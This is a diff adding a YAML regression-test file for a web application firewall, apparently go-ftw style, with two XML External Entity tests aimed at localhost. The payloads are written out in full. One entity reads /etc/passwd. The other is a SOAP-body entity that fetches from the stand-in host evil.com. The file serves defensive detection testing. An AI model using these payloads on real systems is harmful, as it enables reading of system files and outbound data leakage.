@@ -1,0 +1,36 @@
+meta:
+  author: "Antigravity"
+  description: "XML External Entity (XXE) Attacks"
+  enabled: true
+  name: "910-xxe-injection"
+tests:
+  - test_id: 910100
+    desc: "Basic XXE Injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
+          output:
+            log_contains: "id \"910"
+  - test_id: 910101
+    desc: "XXE via SOAP Body"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+              Content-Type: "application/soap+xml"
+            data: "<soap:Body><foo><!DOCTYPE test [ <!ENTITY % xxe SYSTEM \"http://evil.com/xxe\"> %xxe; ]></foo></soap:Body>"
+          output:
+            log_contains: "id \"910"
